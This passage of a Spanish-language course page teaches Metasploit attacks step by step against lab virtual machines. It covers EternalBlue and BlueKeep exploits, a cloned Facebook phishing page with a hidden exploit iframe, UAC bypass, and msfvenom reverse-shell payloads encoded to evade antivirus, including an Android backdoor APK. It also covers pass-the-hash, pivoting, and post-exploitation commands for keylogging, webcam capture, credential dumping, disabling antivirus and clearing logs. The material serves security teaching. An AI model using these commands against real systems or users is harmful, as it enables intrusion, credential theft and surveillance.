+<p>jobs – muestra/finaliza los módulos en ejecución en segundo plano run – permite ejecutar un módulo auxiliar cargado en el contexto de la consola. route – enruta sockets a sesiones (similar al route de Linux). Útil en pivoting</p>
+<p>ENTORNO DE TRABAJO Posible estructura de un entorno de trabajo para la prácticas</p>
+<p>ENTORNO DE TRABAJO</p>
+<ul>
+<li>Maquina vulnerable Metasploitable</li>
+</ul>
+<p>• http://sourceforge.net/projects/metasploitable/ • Login/passwd: msfadmin / msfadmin</p>
+<ul>
+<li>Metasploitable 2 Guide</li>
+<li>https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/</li>
+<li>Maquina atacante: Kali Linux</li>
+<li>Otras distribuciones Linux vulnerables: https://www.vulnhub.com/</li>
+<li>Versiones de Windows: https://www.microsoft.com/es-es/software-download/windows11</li>
+<li>https://tb.rg-adguard.net/public.php</li>
+<li>https://drive.google.com/drive/folders/12fX6vgN-Spng_idh-EwD6OGbiWwvFkBZ</li>
+</ul>
+<p>AUXILIARY MODULE: ¿QUÉ PODEMOS HACER?</p>
+<p>PAYLOADS: ¿REVERSE O BIND?</p>
+<p>MV KALI LINUX + MV + METASPLOITABLE + POSTGRESQL Integración base de datos y utilizar db_nmap 1.- Abrir máquina VM y comprobar conexión de red 2.- Activamos el servicio postgresql service postgresql start 3.- msfdb init para inicializar la BD y abrimos Metasploit (msfconsole) 4.- db_status nos muestra las conexiones 5.- Si no conecta db_connect msf_user:PASSWORD@127.0.0.1:5432/msf_database 6.- db_nmap –A IP 7.- hosts muestra las máquinas que están en la BD 8.- services muestra todos los servicios de las máquinas de la BD 9.- vulns muestra las vulnerabilidades de las máquinas de la BD 10.- creds muestra las credenciales de las máquinas de la BD 11.- db_export -f xml bd exporta toda la información de la BD a formato XML en el archivo bd PoC0 – Integración BD</p>
+<p>ESCÁNERES DE SERVICIOS</p>
+<ul>
+<li>FTP</li>
+<li>auxiliary/scanner/ftp/ftp_version</li>
+<li>SSH</li>
+<li>auxiliary/scanner/ssh/ssh_version</li>
+<li>Idem para HTTP…</li>
+<li>SMB</li>
+<li>auxiliary/scanner/smb/smb_version</li>
+<li>auxiliary/scanner/smb/smb_enumshares</li>
+</ul>
+<p>ESCÁNERES DE SERVICIOS</p>
+<ul>
+<li>Escáner de puertos</li>
+<li>auxiliary/scanner/portscan/tcp</li>
+<li>Muy útil!</li>
+<li>auxiliary/scanner/discovery/arp_sweep</li>
+<li>Los auxiliary discovery… (interesantes…)</li>
+</ul>
+<p>MV KALI LINUX + MV 7 + METASPLOITABLE Pruebas de fingerprinting con módulos auxiliary (portscan tcp, ssh_version, ftp_version) 1.- Abrir máquina Metasploitable / Win7 y comprobar conexión de red 2.- Abrimos Metasploit (msfconsole) 3.- Probamos los siguientes módulos auxiliares observando los resultados a) auxiliary/scanner/ftp/ftp_version b) auxiliary/scanner/ssh/ssh_version c) auxiliary/scanner/smb/smb_version d) auxiliary/scanner/smb/smb_enumshares e) auxiliary/scanner/portscan/tcp f) auxiliary/scanner/discovery/arp_sweep PoC1 – Módulos auxiliary</p>
+<p>TIPOS DE EXPLOTACIÓN</p>
+<ul>
+<li>Explotación directa</li>
+<li>Client-Side</li>
+<li>Explotación local</li>
+<li>Fileformat</li>
+</ul>
+<p>TIPOS DE EXPLOTACIÓN: DIRECTA</p>
+<ul>
+<li>Sin interacción</li>
+<li>Mucho miedo… Solo con conectividad…</li>
+<li>Se debe a software no actualizado y el cual puede provocar que un usuario</li>
+</ul>
+<p>malicioso obtenga el control mediante la ejecución de… ¡EJECUCIÓN DE CÓDIGO ARBITRARIO!</p>
+<p>MV KALI LINUX + MV 7 Explotar vulnerabilidad CVE-2017-010 con Eternalblue y Doublepulsar desde Metasploit 1.-Abrir máquina Win7 y comprobar conexión de red 2.-Abrir maquina Kali Linux y Nmap IP máquinaXP: nmap –sV –O IP para ver puertos y servicios abiertos 3.- Si usas Kali Linux x64 vendrá preparado para usar Wine64, así que el primer paso es configurarlo para que funcione con binarios de 32bits.</p>
+<p>dpkg --add-architecture i386</p>
+<div class="terminal-box">
+<div class="terminal-bar">
+<div class="terminal-dots">
+<span class="dot dot-red"></span>
+<span class="dot dot-yellow"></span>
+<span class="dot dot-green"></span>
+</div>
+<div class="terminal-title"> Codi / Comandes</div>
+<div class="terminal-actions">
+<button class="btn-copy" onclick="copyCode(this)" title="Copiar codi">📋 Copiar</button>
+<span class="terminal-lang">BASH</span>
+</div>
+</div>
+<pre><code>Apt-get update
+apt-get install wine32</code></pre>
+</div>
+<p>rm -r ~/.wine wine cmd.exe Exit 4.- Descargarmos el repositorio del exploit git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit 5.- Cargamos el módulo a Metasploit</p>
+<div class="terminal-box">
+<div class="terminal-bar">
+<div class="terminal-dots">
+<span class="dot dot-red"></span>
+<span class="dot dot-yellow"></span>
+<span class="dot dot-green"></span>
+</div>
+<div class="terminal-title"> Codi / Comandes</div>
+<div class="terminal-actions">
+<button class="btn-copy" onclick="copyCode(this)" title="Copiar codi">📋 Copiar</button>
+<span class="terminal-lang">BASH</span>
+</div>
+</div>
+<pre><code>cd Eternalblue-Doublepulsar-Metasploit</code></pre>
+</div>
+<p>cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ 6.- Abrimos Metasploit (msfconsole) 7.- Explotando CVE-2017-010 use exploit/windows/smb/eternalblue_doublepulsar show options set DOUBLEPULSARPATH /root/Desktop/Eternalblue-Doublepulsar-Metasploit/deps ** REVISAR Rutas (Desktop/Escritorio) set ETERNALBLUEPATH /root/Desktop/Eternalblue-Doublepulsar-Metasploit/deps ** REVISAR Rutas (Desktop/Escritorio) Para x64 set PROCESSINJECT lsass.exe Para x86 set PROCESSINJECT wlms.exe set RHOST 192.168.1.XXX set TARGETARCHITECTURE x64 ó x86 show targets y elegir el correspondiente con set target 8 Para x64 set PAYLOAD windows/x64/meterpreter/reverse_tcp Para x86 set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.1.XXX Exploit O simplemente usamos el siguiente exploit use exploit/windows/smb/ms17_010_eternalblue PoC2 – WIN 7 CVE-2017-010</p>
+<p>MV KALI LINUX + MV 7 Explotar vulnerabilidad CVE-2019-0708 (BlueKeep Microsoft Remote Desktop RCE) 1.-Abrir máquina Win7 y comprobar conexión de red 2.-Abrir maquina Kali Linux y Nmap IP máquinaXP: nmap –sV –O IP para ver puertos y servicios abiertos 3.-Abrimos Metasploit (msfconsole) 4.- Explotando CVE-2017-010</p>
+<ul>
+<li>Comprobamos si es vulnerable</li>
+</ul>
+<p>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep show options set RHOSTS 192.168.1.XXX exploit</p>
+<ul>
+<li>Explotamos vulnerabilidad</li>
+</ul>
+<p>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce show options set RHOSTS 192.168.1.XXX show targets (y elegir el correspondiente ej set target 4) Para x64 set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit PoC2a – WIN 7 CVE-2019-0708</p>
+<p>MV KALI LINUX + MV 7 Explotar vulnerabilidad de una aplicación de terceros 1.- Abrir máquina Win7 (Muy importante sin actualizaciones y a ser posible original!! ) y comprobar conexión de red 2.- Instalamos Easy File Management Web Server (o comprobar que está instalado) y abrimos el software 3.- Abrir maquina Kali Linux y Nmap IP máquinaXP: nmap –sV –O IP para ver puertos y servicios abiertos 4.- Descargar exploit de https://www.exploit-db.com/exploits/33790/ y copiarlo en la carpeta /usr/share/metasploit- framework/modules/exploits/NOMBRE (actualizar si estamos en Metasploit: reload_all) 5.- Abrimos Metasploit (msfconsole) 6.- Usar el exploit de la vulnerabilidad exploit/nombre ERROR: set payload generic/shell_reverse_tcp o set RPORT 443 y set SSL true PoC2b – WIN 7 EASY</p>
+<p>MV KALI LINUX + MV METASPLOITABLE2 Identificación de servicios y explotación 1.- Abrir maquina Metasploitable 2 y comprobar conexión red 2.- Abrir maquina Kali Linux y Nmap IP Metasploitable: nmap –A –p0-65535 IP 3.- Ver puertos y servicios abiertos (Un montón!! ) 4.- Probamos algunas vulnerabilidades (https://computersecuritystudent.com/cgi- bin/CSS/process_request_v3.pl?HID=f213c73c216e2231c8f0d65f3d93ac18&amp;TYPE=SUB) , para ello utilizaremos Metasploit (msfconsole)  TOMCAT 8180 Con la utilidad Tomcat Application Manager Login Utility, podemos intentar encontrar las credenciales de Tomcat auxiliary/scanner/http/tomcat_mgr_login y con unas credenciales válidas podemos probar la Tomcat Manager Application Deployer exploit/multi/http/tomcat_mgr_deploy  VSFTPD 21 Podemos explotar un backdoor malicioso que fue añadido a la versión que tenemos con exploit/unix/ftp/vsftpd_234_backdoor  Unreal IRCd 6667 Otra que podemos explotar es el puerto IRC con la puerta trasera a través del siguiente exploit exploit/unix/irc/unreal_ircd_3281_backdoor whoami, hostname, ls, cat /etc/passwd, grep root /etc/shadow, date, … Payload java/meterpreter/reverse_http PoC3 – METASPLOITABLE 2</p>
+<p>MV KALI LINUX + MV 7 Explotar vulnerabilidad de Denegación de Servicio 1.- Abrir máquina Win7 y comprobar conexión de red 2.- Abrimos Metasploit (msfconsole) 3.- Usamos el módulo auxiliary que nos permite realizar una DoS contra la máquina Win7 a través del puerto 3389 auxiliary/dos/windows/rdp/ms12_020_maxchannelids 4.- Comprobar si funciona, si no, Propiedades – Sistema – Configuración de acceso remoto – Acceso remoto - Permitir las conexiones desde equipos 5.- Si estuviese instalado el parche kb2667402, se podría desinstalar de las actualizaciones para probar su funcionamiento PoC4 – WIN 7 DoS</p>
+<p>TIPOS DE EXPLOTACIÓN: CLIENT-SIDE</p>
+<ul>
+<li>La víctima se conecta a un servidor que le lanza el exploit</li>
+<li>¿Cómo hacer para qué la víctima se conecte? (Debate…)</li>
+</ul>
+<p>TIPOS DE EXPLOTACIÓN: CLIENT-SIDE</p>
+<ul>
+<li>¿¿Mailing?? (spam en toda regla…)</li>
+<li>¿Hacking web? (cuando entres… ZAS!)</li>
+<li>Links en foros… (links en todos lados)</li>
+<li>Dns Spoofing</li>
+<li>¿Twitter y los acortadores? (vale…)</li>
+</ul>
+<p>TIPOS DE EXPLOTACIÓN: CLIENT-SIDE</p>
+<ul>
+<li>La víctima recibe un incentivo</li>
+<li>Este incentivo proviene del atacante por algún medio</li>
+</ul>
+<p>comentado anteriormente</p>
+<ul>
+<li>La víctima realiza la petición y acaba encontrando</li>
+</ul>
+<p>uno o varios exploits…</p>
+<ul>
+<li>¿Objetivo? Por ejemplo, acabar siendo un zombie!</li>
+</ul>
+<p>MV KALI LINUX + MV 7 Explotación Client-Side (JAVA 7 update 10) 1.- Abrir máquina Win 7 y comprobar conexión de red 2.- CREAMOS WEB “FALSA” gmail.com/Facebook.com/… con SETOOLKIT desde KALI a) Ejecutamos setoolkit b)</p>
+<h4>1) Social-Engineering Attacks</h4>
+<p>c)</p>
+<h4>2) Website Attack Vectors</h4>
+<p>d)</p>
+<h4>3) Credential Harvester Attack Method</h4>
+<p>e)</p>
+<h4>1) Web Template</h4>
+<p>ó</p>
+<h4>2) Site Cloner</h4>
+<p>f)</p>
+<div class="terminal-box">
+<div class="terminal-bar">
+<div class="terminal-dots">
+<span class="dot dot-red"></span>
+<span class="dot dot-yellow"></span>
+<span class="dot dot-green"></span>
+</div>
+<div class="terminal-title"> Codi / Comandes</div>
+<div class="terminal-actions">
+<button class="btn-copy" onclick="copyCode(this)" title="Copiar codi">📋 Copiar</button>
+<span class="terminal-lang">BASH</span>
+</div>
+</div>
+<pre><code>IP address for the POST back in Harvester/Tabnabbing: IP Kali</code></pre>
+</div>
+<p>g) Enter the url to clone: www.facebook.com (u otra web a clonar) h) Apache may be not running, do you want SET to start the process? [y/n]: n (Más Adelante lo encenderemos /etc/init.d/apache2 start) i) Añadimos al archvo creado /root/.set/index.html (si es clonada) o /root/.set/web_clone/index.html (si es plantilla), al final antes de &lt;/body&gt;: &lt;iframe src="http://IPKALI:8080/" width=0 height=0 /&gt; 3.- Abrimos Metasploit (msfconsole) 4.- ACTIVAMOS SERVIDOR a) use exploit/multi/browser/java_jre17_jmxbean b) set URIPATH / c) set TARGET 0 d) set PAYLOAD windows/meterpreter/reverse_tcp e) set LHOST 192.168.0.21 f) set InitialAutoRunScript 'migrate -f' g) exploit 5.- ACCESO DESDE WIN7 Tenemos que tener instalado JAVA7 update 10 http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html#jre-7u10-oth-JPR o http://www.oldapps.com/java.php?old_java=8606 http://IPKALI/ 6.- Si todo ok tendremos la sesión de Meterpreter en nuestro Kali PoC4b - Client-Side</p>
+<div class="terminal-box">
+<div class="terminal-bar">
+<div class="terminal-dots">
+<span class="dot dot-red"></span>
+<span class="dot dot-yellow"></span>
+<span class="dot dot-green"></span>
+</div>
+<div class="terminal-title"> Codi / Comandes</div>
+<div class="terminal-actions">
+<button class="btn-copy" onclick="copyCode(this)" title="Copiar codi">📋 Copiar</button>
+<span class="terminal-lang">BASH</span>
+</div>
+</div>
+<pre><code>sudo lsof -t -i tcp:80 -s tcp:listen | sudo xargs kill</code></pre>
+</div>
+<p>TIPOS DE EXPLOTACIÓN: LOCAL</p>
+<p>MV KALI LINUX + MV 7 Explotación Local 1.- Abrir máquina Win 7 y acceder con el usuario alumno. Comprobar conexión de red 2.- Abrimos Metasploit (msfconsole) 3.- Una vez obtenida una sesión vulnerando el sistema de alguna forma vista anteriormente, ejecutamos background para dejar la sesión abierta y continuar ejecutando metasploit 4.- Se utilizan preferentemente para escalar privilegios en local utilizaremos exploit/windows/local/.</p>
+<p>Trataremos de obtener privilegios a través de UAC(User Account Control) que se utiliza, entre otros, para impedir que aplicaciones maliciosas hagan cambios no autorizados en el ordenador (UAC permite a los usuarios realizar tareas comunes como no administradores y como administradores pero sin tener que cambiar de usuario, cerrar sesión ni utilizar Ejecutar como) a) use exploit/windows/local/bypassuac b) set TECHNIQUE PSH (Para utilizar la técnica de PowerShell que pasa más desapercibida frente a los antivirus) c) set PAYLOAD windows/meterpreter/reverse_tcp d) set LHOST 192.168.0.21 e) set SESSION id_sesión f) exploit (si hay algún trabajo en segundo plano borramos todo con jobs –K) 5.- Otra forma a) use exploit/windows/local/ms14_058_track_popup_menu b) use exploit/windows/local/bypassuac_eventvwr c) use exploit/windows/local/ms16_032_secondary_logon_handle_privesc d) use exploit/windows/local/bypassuac_injection e) use exploit/windows/local/bypassuac_fodhelper Llegados a este punto, si no hubiéramos conseguido la escalada de privilegios, podríamos ejecutar el comando systeminfo (dentro de la Shell) y la información extraída la pasaríamos a Windows Exploit Suggester (https://github.com/bitsadmin/wesng) para determinar el tipo de vulnerabilidad que podemos aprovechar para realizar la escalada de privilegios.</p>
+<p>PoC5 - Local</p>
+<p>TIPOS DE EXPLOTACIÓN: FILEFORMAT</p>
+<p>MV KALI LINUX + MV 7 Explotar vulnerabilidad de FileFormat 1.- Abrir máquina Windows y comprobar conexión de red 2.- Abrimos Metasploit (msfconsole) 3.- Usamos el módulo exploit que nos permite crear un PDF malicioso a partir de uno real exploit/windows/fileformat/adobe_pdf_embedded_exe 4.- Configurar los parámetros FILENAME, INFILENAME y LAUNCH_MESSAGE 5.- Hacerlo llegar de alguna manera, mediante ingeniería social, a la víctima (correo, etc…) 6.- Mientras tanto recibiremos la conexión o sesión remota a través del exploit/multi/handler configurando el PAYLOAD (windows/meterpreter/reverse_tcp) con LHOST de la máquina atacante.</p>
+<p>** Versiones antiguas www.oldapps.com http://www.oldapps.com/es/adobe_reader.php?old_adobe=14 PoC6 – FileFormat</p>
+<p>POST-EXPLOTACIÓN: METERPRETER POWER Un pequeño resumen básico de lo que puede hacer este payload</p>
+<ul>
+<li>migrate &lt;pid&gt; (migrar a otro proceso)</li>
+<li>hashdump (obtener hashes y usuarios)</li>
+<li>Comandos linux (sobre la máquina víctima)</li>
+<li>upload / download (subir y descargar archivos)</li>
+<li>search –f (búsqueda en el equipo víctima)</li>
+<li>getuid / getprivs (consulta y obtención privs)</li>
+<li>execute -f (lanza comandos sobre la víctima)</li>
+<li>Con –i interactuamos, por ejemplo execute –f cmd.exe -i</li>
+</ul>
+<ul>
+<li>ps (lista procesos de la máquina víctima)</li>
+<li>shell (abre una línea de comandos)</li>
+<li>sysinfo (info sobre el sistema)</li>
+<li>timestomp (manipular atributos archivos antiforensics)</li>
+<li>Webcam y micrófono… (spy!!!)</li>
+<li>idletime (cuanto tiempo lleva el usuario sin utilizar la máquina)</li>
+<li>screenshot (obtener captura de escritorio)</li>
+<li>keyscan_start</li>
+<li>clearev (limpiar el event log)</li>
+</ul>
+<p>POST-EXPLOTACIÓN: METERPRETER POWER</p>
+<p>Y MÁS METERPRETER…</p>
+<ul>
+<li>El comando run…</li>
+<li>Para lanzar scripts de meterpreter</li>
+</ul>
+<p>Display all 186 possibilities? (y or n) run arp_scanner run autoroute run checkvm run credcollect run domain_list_gen run dumplinks run duplicate run enum_chrome run enum_firefox run enum_logged_on_users run enum_powershell_env run enum_putty run enum_shares run enum_vmware run event_manager run file_collector run get_application_list run get_env run get_filezilla_creds run get_local_subnets run get_pidgin_creds run get_valid_community run getcountermeasure run getgui run gettelnet run getvncpw run hashdump run hostsedit run keylogrecorder run killav run metsvc run migrate run multi_console_command run multi_meter_inject run multicommand run multiscript run netenum run packetrecorder run panda_2007_pavsrv51 run persistence run pml_driver_config run post/multi/gather/apple_ios_backup run post/multi/gather/dns_bruteforce run post/multi/gather/dns_reverse_lookup run post/multi/gather/dns_srv_lookup run post/multi/gather/enum_vbox run post/multi/gather/env run post/multi/gather/filezilla_client_cred run post/multi/gather/find_vmx run post/multi/gather/firefox_creds run post/multi/gather/multi_command run post/multi/gather/pidgin_cred run post/multi/gather/ping_sweep run post/multi/gather/run_console_rc_file run post/multi/gather/thunderbird_creds run post/multi/general/close run post/multi/general/execute run post/multi/manage/multi_post run post/multi/pro/agent run post/multi/pro/agent_cleaner run post/multi/pro/macro run post/windows/capture/keylog_recorder run post/windows/capture/lockout_keylogger run powerdump run prefetchtool run process_memdump run remotewinenum run scheduleme run schelevator run schtasksabuse run scraper run screen_unlock run screenspy run search_dwld run service_manager run service_permissions_escalate run sound_recorder run srt_webdrive_priv run uploadexec run virtualbox_sysenter_dos run virusscan_bypass run vnc run webcam run win32-sshclient run win32-sshserver run winbf run winenum run wmic Y mas!!! :D</p>
+<p>POST-EXPLOTACIÓN: RECOPILACIÓN INFORMACIÓN Necesarios en un pentest</p>
+<ul>
+<li>Winenum: Recopila información completa del sistema</li>
+<li>Scraper: Recopila información del registro</li>
+</ul>
+<p>POST-EXPLOTACIÓN: RECOPILACIÓN INFORMACIÓN</p>
+<ul>
+<li>Checkvm: Identifica si el sistema víctima se encuentra en una VM use post/windows/gather/checkvm</li>
+<li>GetCounterMeasure: Consulta configuración de seguridad existente y permite deshabilidat AV, Firewalls, …</li>
+</ul>
+<p>use post/windows/manage/killav</p>
+<ul>
+<li>GetGUI: Permite habilitar escritorio remoto use post/windows/manage/enable_rdp</li>
+</ul>
+<p>• En Linux: rdesktop ip –u usuario –p pass</p>
+<ul>
+<li>GetTelnet: Permite habilitar servicio telnet</li>
+<li>KillAV: Permite deshabilitar AV y otras medidas de seguridad use post/windows/manage/killav</li>
+<li>Get_Local_Subnets</li>
+</ul>
+<p>Permite consultar las interfaces de red (útil para el pivoting)  use post/multi/manage/autoroute</p>
+<ul>
+<li>HostsEdit: Permite modificar el archivo hosts use post/windows/manage/inject_host</li>
+</ul>
+<p>• Run hostsedit –e ip dominio.com</p>
+<ul>
+<li>Wlan_Bss_List: Permite listar las redes configuradas use post/windows/wlan/wlan_bss_list</li>
+<li>Wlan_profiles</li>
+</ul>
+<p>Muestra los perfiles de las redes (incluidas las contraseñas)  use post/windows/wlan/wlan_profile</p>
+<ul>
+<li>post/windows/gather/enum_chrome - extract sensitive information from the</li>
+</ul>
+<p>Google Chrome web browser</p>
+<ul>
+<li>post/windows/gather/credentials/total_commander - extract passwords from</li>
+</ul>
+<p>Total Commander</p>
+<ul>
+<li>post/windows/escalate/screen_unlock - Unlock Windows screen (be careful</li>
+</ul>
+<p>with this module)</p>
+<ul>
+<li>post/windows/gather/phish_windows_credentials - phishing attack on Windows</li>
+</ul>
+<p>credentials POST-EXPLOTACIÓN: RECOPILACIÓN INFORMACIÓN</p>
+<p>POST-EXPLOTACIÓN: PERSISTENCIA • Metsvc post/windows/manage/persistence_exe Generate a malicious exe (note that the payload you choose may be different): • msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attackers ip&gt; LPORT=4444 -f exe -o /tmp/evil.exe Run this in meterpreter</p>
+<p>• use post/windows/manage/persistence_exe • set REXEPATH /tmp/evil.exe • set SESSION &lt;session number&gt; • set STARTUP USER/SYSTEM • set LocalExePath C:\\tmp • run Poner a la escucha • use exploit/multi/handler • set payload windows/x64/meterpreter/reverse_tcp • Set LHOST IP Kali • Exploit https://techvomit.net/metasploit-cheatsheet/</p>
+<p>POST-EXPLOTACIÓN: RECOPILACIÓN INFORMACIÓN Necesarios en un pentest</p>
+<ul>
+<li>Módulo Mimikatz y Kiwi, permite extraer contraseñas en plano del fichero lsass.exe</li>
+</ul>
+<p>(almacena las credenciales en memoria en representación de los usuarios con sesiones de Windows activas)</p>
+<ul>
+<li>load mimikatz/wiki wdigest / tspkg / kerberos / … / creds_all</li>
+<li>Módulo Sniffer, permite esnifar las interfaces de los equipos vulnerados</li>
+<li>load sniffer sniffer_interfaces / sniffer_start / …</li>
+<li>Volcado de memoria de un proceso</li>
+<li>run process_memdump -h</li>
+</ul>
+<p>https://www.offensive-security.com/metasploit-unleashed/mimikatz/</p>
+<p>MV KALI LINUX + MV 7 Creación de una web falsa (Phising) 1.- Abrir máquina Kali y comprobar conexión de red 2.- Abrimos Social Engineer Toolkit (setoolkit) 3.- Seleccionamos 1) Social-Engineering Attacks 4.- Seleccionamos 2) Website Attack Vectors 5.- Seleccionamos 3) Credential Harvester Attack Method 6.- Seleccionar 1) Web Templates o 2) Site Cloner 7.- Nos pedirá la IP de la máquina atacante (Kali) 8.- Introducimos la web a clonar http://www.facebook.com 9.- Abrir máquina Win7 y comprobar conexión de red 10.- Abrimos el navegador y accedemos a IP Kali y observamos el clon de Facebook. Al introducir nuestras credenciales nos llevará a la web original de Facebook 11.- En la máquina Kali, podremos ver las credenciales introducidas en la máquina de Win7 Ahora vamos a crear un FakeDNS con Facebook, para que el usuario no tenga que introducir la IP y sea más creíble el ataque. Vamos a la máquina Kali y abrimos Metasploit (msfconsole) 12.- Usamos el modulo auxiliar FakeDNS auxiliary/server/fakedns y configuramos el TARGETDOMAIN con el *.dominio y el TARGETACTION a FAKE 12.- En la maquina Win7, cambiamos en la configuración de DNS a la IP de la maquina KALI. Comprobar con el nombre de dominio y luego ver las credenciales obtenidas en la máquina Kali (SEToolkit) PoC7 – WIN 7 Phising</p>
+<p>MV KALI LINUX + MV 7 Creación de un Backdoor sin detección de antivirus 1.- Abrir máquina Kali y comprobar conexión de red 2.- msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=192.168.0.21 LPORT=4444 -f exe &gt; antivirus.exe 3.- El archivo creado lo copiaremos a /var/www/html si lo que queremos es hacerlo llegar por el servidor web (activarlo), sino, hacerlo llegar de alguna forma. service apache2 start 4.- Mientras tanto recibiremos la conexión o sesión remota a través del exploit/multi/handler configurando el PAYLOAD (windows/meterpreter/reverse_tcp) con LHOST de la máquina atacante 5.- Abrir máquina Win7 y comprobar conexión de red 6.- Abrimos el navegador y escribimos IPKali/antivirus.exe y nos descargará el archivo, que al ejecutarlo, la maquina atacante recibirá la conexión ** Subimos el archivo a https://www.virustotal.com/ y comprobamos que antivirus detectan y cuales no detectan el archivo creado. Se podría intentar ofuscar más. A practicar!!</p>
+<p>PoC8 – WIN 7 Backdoor</p>
+<p>MV KALI LINUX + MOVIL ANDROID Creación de un Backdoor (APK) para Android 1.- Abrir máquina Kali y comprobar conexión de red 2.- Para crear la aplicación backdoor que contiene el meterpreter ejecutamos msfvemon con la siguiente instrucción msfvenom –p android/meterpreter/reverse_tcp LHOST=IPKali LPORT=1234 &gt; shell.apk 3.- Mientras tanto recibiremos la conexión o sesión remota a través del exploit/multi/handler configurando el PAYLOAD (android/meterpreter/reverse_tcp) con LHOST de la máquina atacante 4.- De alguna manera, hemos de hacer llegar este archivo a la víctima. En nuestro caso, copiamos el archivo a /var/www/html y a través del navegador en el dispositivo Android nos lo descargamos.</p>
+<p>5.- Lo instalamos en la máquina ANDROID, fijándonos en los permisos que ACEPTAMOS y lo ejecutamos. 5.- Comprobar que al ejecutarlo ya tenemos el meterpreter y podemos hacer… lo que deseemos! PoC9 – ANDROID</p>
+<p>MV KALI LINUX + MV 7 Explotar vulnerabilidad con PowerShell 1.- Abrir máquina Kali y comprobar conexión de red 2.- Abrimos Social Engineer Toolkit (setoolkit) 3.- Seleccionamos 1) Social-Engineering Attacks 4.- Seleccionamos 9) Powershell Attack Vectors 5.- Seleccionamos el payload 1) Powershell Alphanumeric Shellcode Inhjector 6.- Nos pedirá la IP de la máquina atacante (Kali) que estará ala escucha 7.- Dejamos el puerto por defecto 443 u otro alternativo 8.- Nos crea el archivo x86_powershell_injection.txt en /root/.set/reports/powershell y le damos a la escucha, además copiamos el archivo a /var/www/html 9.- Abrir máquina Win7 y comprobar conexión de red 10.- Abrimos navegador y escribimos IPKALI/x86_powershell_injection.txt 11.- Seleccionamos el texto y lo copiamos 12.- Abrimos Windows PowerShell y pegamos el código generado 13.- Observamos que se obtiene la conexión en la maquina atacante.</p>
+<p>PoC10 – WIN 7 PowerShell BD</p>
+<p>MV KALI LINUX + MV 7 Desarrollar de un script de Meterpreter 1.- Abrir máquina Kali y comprobar conexión de red 2.- Pegar código en archivo .rb 3.- Abrimos Metasploit (mfsconsole) 4.- Una vez explotada alguna vulnerabilidad, probamos el script anterior con run nombre_script –h para obtener la ayuda y run nombre_script –s Mensaje para abrir un mensaje en la máquina vulnerada PoC11 – Script Meterpreter</p>
+<p>MV KALI LINUX + MV 7 A + MV 7 B Técnica que captura credenciales y posterior uso para autenticación en otros equipos en la red. 1.- Abrir máquina Win7 A (Clon de B) y comprobar conexión de red 2.- Abrimos Metasploit (msfconsole) 3.- Obtenemos acceso a través de las vulnerabilidades disponibles 4.- Una vez obtenido la sesión de Meterpreter, lanzamos comando hashdump y obtenemos los hashes LM y NT de los usuarios 5.- Para impersonalizar el acceso a otro equipo de la red máquina Win 7 B utilizamos exploit/windows/smb/psexec 6.- Configuramos RHOST, SMBUser ‘Administrador’ y SMBPass ‘HashObtenidoPasoAnterior’ 7.- Se configura el PAYLOAD windows/meterpreter/reverse_tcp y lanzamos el comando exploit ** net user Administrador /active:yes PoC12 – Pass The Hash</p>
+<p>MV KALI LINUX + MV 7 A + MV 7 B Técnica que permite pivotar a otra red 1.- Abrir máquina Win7 A, Win 7 B y Kali y comprobar conexión de red 2.- Configuramos Win7A (Victim) en la red 10.0.0.0/24, Win Win7B (Pivot)con dos interfaces 10.0.0.0/24 y 192.168.1.0/24, y Kali en la interface 192.168.1.0/24 3.- Comprobamos que no se tiene acceso desde Kali a Win7A (Victima) 4.- Explotamos a través de alguna vulnerabilidad la máquina de Win7B (Pivot) comprobamos que tiene 2 interfaces ifconfig 5.- Ponemos en background (Crtl+Z).</p>
+<p>6.- Con el comando route añadimos la ruta de la maquina vulnerada para poder llegar a la otra red a través de ella route add ip_maq_vulnerada_interface_nueva mascara_maq_vulnerada session route add 10.0.0.0/24 2 7.- Comprobamos route print 8.- Realizaremos un escaneo a la nueva red, para ver que máquinas hay y que puertos están abiertos use auxiliary/scanner/portscan/tcp 9.- set RHOSTS IP_red_nueva/24 y lanzar run 10.- Una vez tenemos la máquina y puertos/servicios podemos intentar vulnerar alguna de ellas o utilizar el PassTheHash https://www.hackplayers.com//taller-de-pivoting-metasploit.html https://www.zonasystem.com//pivoting-con-metasploit-route-portfwd-y-portproxy.html PoC13 – Pivoting</p>
+<p>BIBLIOGRAFÍA / WEBS</p>
+<ul>
+<li>“Metasploit para Pentesters”, 0xWord, Pablo González Pérez</li>
+<li>“Pentesting con Kali”, 0xWord, Pablo González Pérez, Germán Sánchez Garcés, Jose Miguel Soriano</li>
+</ul>
+<p>de la Cámara</p>
+<ul>
+<li>“Ethical Hacking: Teoría y práctica para la realización de un pentesting”, 0xWord, Pablo González</li>
+</ul>
+<p>Pérez</p>
+<ul>
+<li>Flu-Project, http://www.flu-project.com/</li>
+<li>Un informático en el lado del mal, http://www.elladodelmal.com/</li>
+<li>Hacking ético, http://hacking-etico.com/</li>
+<li>Security by default, http://www.securitybydefault.com/</li>
+<li>Security art work, http://www.securityartwork.es/</li>
+<li>Hack players, http://www.hackplayers.com/</li>
+<li>The hacker way, https://thehackerway.com/</li>
+<li>50 blogs en castellano de seguridad informática,</li>
+</ul>
+<p>http://blogs.protegerse.com/laboratorio//25/50-blogs-en-castellano-que-deberias-leer-by- kinomakino/</p>
+<div class="page-nav-footer">
+<a class="page-nav-btn" href="../ut15/ut15actividades.html">⬅️ ✍️ Activitats pràctiques UT15</a>
+<a class="page-nav-btn" href="../ut16/ut1601.html">16.1 Explotación ➡️</a>
+</div>
+</main>
+</div>
+<script>
+    (function() {
+      const saved = localStorage.getItem('portal-theme');
+      if (saved) document.documentElement.setAttribute('data-theme', saved);
+    })();
+    function toggleTheme() {
+      const html = document.documentElement;
+      const next = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      html.setAttribute('data-theme', next);
+      localStorage.setItem('portal-theme', next);
+    }
+    function copyCode(btn) {
+      const pre = btn.closest('.terminal-box').querySelector('pre');
+      if (!pre) return;
